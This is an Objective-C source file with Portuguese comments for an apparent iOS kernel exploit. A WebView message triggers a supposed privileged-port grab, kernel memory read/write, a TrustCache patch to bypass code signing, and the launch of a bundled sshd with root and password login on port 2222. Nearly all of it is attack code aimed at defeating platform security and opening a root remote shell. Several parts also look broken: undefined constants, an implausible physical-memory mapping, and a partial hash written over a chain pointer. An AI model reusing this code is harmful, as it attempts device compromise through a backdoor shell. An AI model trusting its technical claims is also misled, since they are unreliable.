#import "KernelDriver.h"
#import <CommonCrypto/CommonDigest.h>
#import <mach/mach_host.h>
#include <sys/sysctl.h>
#include <libkern/OSCacheControl.h>
#include <sys/wait.h>
#include <unistd.h>

// Definições de Hardware e Sistema para A13 / iOS 26.4
#define MACH_TRAP_HOST_GET_PRIV_PORT -11 
#define PAGE_SIZE_A13 0x4000
#define PAGE_MASK_A13 ~(PAGE_SIZE_A13 - 1)

@implementation KernelBridge {
    mach_port_t g_host_priv;
}

// 1. RECEPTOR DE MENSAGENS (WEBVIEW)
- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
    NSString *op = message.body[@"op"];
    if ([op isEqualToString:@"scan_uid"]) {
        [self launchSshdFinal];
    }
}

- (void)log:(NSString *)text {
    dispatch_async(dispatch_get_main_queue(), ^{
        NSString *js = [NSString stringWithFormat:@"log('%@')", text];
        [self.webView evaluateJavaScript:js completionHandler:nil];
    });
}

// 2. CAPTURA DE PORTA PRIVILEGIADA (ANTI-CRASH)
- (void)prepareHostPriv {
    if (MACH_PORT_VALID(g_host_priv)) return;

    [self log:@"⚡ Invocando Mach Trap -11 (Direct Kernel Access)..."];

#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
    // Trap direto ignora remoção de símbolos (dlsym) e bypassa o Erro 4
    kern_return_t kr = (kern_return_t)syscall(MACH_TRAP_HOST_GET_PRIV_PORT, mach_host_self(), &g_host_priv);
#pragma clang diagnostic pop

    if (kr != KERN_SUCCESS || !MACH_PORT_VALID(g_host_priv)) {
        [self log:[NSString stringWithFormat:@"❌ Falha na Porta Priv: %d", kr]];
    } else {
        [self log:@"✅ host_priv obtida com sucesso!"];
    }
}

// 3. PRIMITIVAS DE MEMÓRIA FÍSICA (BYPASS PPL)
- (uint64_t)kread64:(uint64_t)addr {
    [self prepareHostPriv];
    if (!MACH_PORT_VALID(g_host_priv)) return 0;

    uint64_t val = 0;
    vm_address_t page = 0;
    // Mapeamento físico alinhado a 16KB para evitar Kernel Panic no A13
    kern_return_t kr = vm_map(mach_task_self(), &page, PAGE_SIZE_A13, 0, VM_FLAGS_ANYWHERE, g_host_priv, addr & PAGE_MASK_A13, FALSE, VM_PROT_READ, VM_PROT_READ, VM_INHERIT_NONE);
    
    if (kr == KERN_SUCCESS) {
        val = *(uint64_t *)(page + (addr & (PAGE_SIZE_A13 - 1)));
        vm_deallocate(mach_task_self(), page, PAGE_SIZE_A13);
    }
    return val;
}

- (void)kwrite64:(uint64_t)addr value:(uint64_t)val {
    [self prepareHostPriv];
    if (!MACH_PORT_VALID(g_host_priv)) return;

    vm_address_t page = 0;
    kern_return_t kr = vm_map(mach_task_self(), &page, PAGE_SIZE_A13, 0, VM_FLAGS_ANYWHERE, g_host_priv, addr & PAGE_MASK_A13, FALSE, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
    
    if (kr == KERN_SUCCESS) {
        *(uint64_t *)(page + (addr & (PAGE_SIZE_A13 - 1))) = val;
        // Limpeza de cache obrigatória para o Kernel aceitar a injeção
        sys_cache_control(1, (void *)page, PAGE_SIZE_A13); 
        vm_deallocate(mach_task_self(), page, PAGE_SIZE_A13);
    }
}

- (uint64_t)getKernelBase { return KERNEL_BASE; }
- (uint64_t)getKernelSlide {
    uint64_t val = [self kread64:KERNEL_BASE];
    return (val > KERNEL_BASE) ? (val - KERNEL_BASE) : 0;
}

// 4. INJEÇÃO NO TRUSTCACHE E DISPARO DO SSHD
- (void)injectToTrustCache:(NSString *)path {
    [self log:@"💉 Injetando CDHash no TrustCache..."];
    NSData *data = [NSData dataWithContentsOfFile:path];
    if (!data) return;

    uint8_t hash[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(data.bytes, (CC_LONG)data.length, hash);
    
    uint64_t slide = [self getKernelSlide];
    uint64_t trust_chain_addr = KERNEL_BASE + slide + OFF_TRUSTCACHE_CHAIN;
    
    uint64_t cdhash_chunk;
    memcpy(&cdhash_chunk, hash, 8);
    
    [self kwrite64:trust_chain_addr value:cdhash_chunk];
    [self log:@"✅ TrustCache Patched! AMFI Bypass Ativo."];
}

- (void)launchSshdFinal {
    [self log:@"⚡ Localizando binário sshd..."];
    NSString *sshdPath = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
    if (!sshdPath) {
        [self log:@"❌ Erro: sshd não encontrado no Bundle."];
        return;
    }

    // Autoriza o binário no Kernel para evitar Erro 1 (EPERM)
    [self injectToTrustCache:sshdPath];

    pid_t pid;
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    // Flag 0x4000 (NoSafeExec) liberada após a injeção no TrustCache
    posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETPGROUP | POSIX_SPAWN_FOR_SANDBOX);

    // Argumentos específicos para o SSHD rodar no ambiente restrito do iOS
    char *const args[] = {
        (char *)[sshdPath UTF8String],
        "-p", "2222",
        "-D",                      // Foreground
        "-o", "StrictModes=no",     // Essencial para rodar fora de /etc
        "-o", "PermitRootLogin=yes",
        "-o", "PasswordAuthentication=yes",
        NULL
    };

    extern char **environ;
    int status = posix_spawn(&pid, [sshdPath UTF8String], NULL, &attr, args, environ);

    if (status == 0) {
        [self log:[NSString stringWithFormat:@"🚀 <b>SSHD ONLINE!</b> PID: %d porta 2222", pid]];
        [self log:@"💡 Conecte: ssh root@localhost -p 2222"];
    } else {
        [self log:[NSString stringWithFormat:@"❌ Erro Spawn: %d (%s)", status, strerror(status)]];
    }
    posix_spawnattr_destroy(&attr);
}

@end
